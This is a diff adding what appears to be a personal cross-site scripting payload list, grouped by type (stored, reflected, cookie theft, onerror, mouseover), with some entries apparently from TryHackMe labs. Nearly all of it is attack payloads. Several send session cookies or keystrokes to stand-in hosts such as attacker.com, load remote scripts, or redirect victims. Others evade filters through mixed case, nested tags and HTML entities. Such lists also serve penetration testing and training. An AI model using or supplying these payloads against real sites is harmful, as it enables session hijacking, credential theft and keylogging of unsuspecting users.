@@ -1,0 +1,75 @@
+Stored XSS:
+
+<script>alert("XSS")</script>
+<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>
+<script>window.location.href="https://evil.com"</script>
+<script>document.onkeypress = function(e) { new Image().src = "https://attacker.com/keylog.php?k=" + e.keyCode; }</script>
+<script>document.forms[0].onsubmit = function() {document.forms[0].elements[0].value="hacked";}</script>
+<img src=x onerror="alert('XSS')>
+<svg onload="alert(1)"></svg>
+<iframe src="javascript:alert('XSS');"></iframe>
+<script src="http://attacker.com/xss.js"></script>
+
+RXSS:
+<script>window.location.href="https://evil.com"</script>
+<img src=x onerror="alert('XSS')">
+<svg onload="alert(1)"></svg>
+<iframe src="javascript:alert('XSS');"></iframe>
+<script src="http://attacker.com/xss.js"></script>
+<div onmouseover="alert('XSS')">Hover over me!</div>
+
+Session Cookie:
+<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>
+<img src="x" onerror="fetch('https://attacker.com/cookie.php?cookie=' + document.cookie)">
+<script>alert(document.cookie)</script>
+<script>console.log(document.cookie)</script>
+
+orerror:
+<img src="invalid.jpg" onerror="alert('XSS')">
+<img src="invalid.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
+<img src="invalid.jpg" onerror="window.location='https://malicious-site.com'">
+<img src="invalid.jpg" onerror="var script = document.createElement('script'); script.src='https://attacker.com/malicious.js'; document.body.appendChild(script);">
+<img src="invalid.jpg" onerror="document.body.innerHTML += '<div>Your cookie: ' + document.cookie + '</div>';">
+<img src="invalid.jpg" onerror="alert('XSS'); fetch('https://attacker.com/steal?cookie=' + document.cookie);">
+<svg onload="alert('XSS')"></svg>
+
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+
+MouseOver:
+<img src="x" onmouseover="alert('XSS')">
+<div onmouseover="console.log('XSS triggered')">Hover me</div>
+<a href="#" onmouseover="alert('XSS')">Hover here</a>
+<img src="x" onmouseover="&#97;&#108;&#101;&#114;&#116;&#40;'XSS'&#41;">
+<button onmouseover="alert('XSS');document.body.style.backgroundColor='red';">Hover me</button>
+<img src="x" onmouseover="window.location='http://malicious.example.com'">
+<svg onmouseover="alert('XSS')"></svg>
+<span onmouseover="alert(document.cookie)">Hover to see cookies</span>
+<img src="x" onmouseover="javasCript:alert(1)">
+<img src="x" onmouseover="window.location='http://malicious.site'">
+<img src="x" onmouseover="document.location='http://malicious.site/steal?cookie='+document.cookie">
+<img src="x" onmouseover="document.body.innerHTML += '<img src=x onerror=alert(1)>'">
+<img src="x" onmouseover="eval(prompt())">
+<img src="x" onmouseover="document.body.innerHTML += '<script>alert(1)</script>'">
+<img src="x" onmouseover="(function(){alert('XSS')})()">
+
+"onmouseover="javasCript:alert(1)"
+"onmouseover="alert(1)
+"onmouseover="alert('XSS')
+"onmouseover="alert()
+
+
+Defronix:
+alert(1) or prompt("Defronix")
+<script>alert(1)</alert>
+<script>alert("Hacked")</alert>
+<script>alert(document.cookie)</script>
+"><script>alert("FUCKED")</script>
+';alert('THM');//
+<img src=x onerror=alert("THM")>
+<sscriptcript>alert('THM')</sscriptcript>
+<SCRIPT>alert('THM')</SCRIPT>
+<ScRiPt>alert('THM')</ScRiPt>
+/images/cat.jpg" onload="alert("who");
+"><img src=x onerror=alert("THM")>//
+
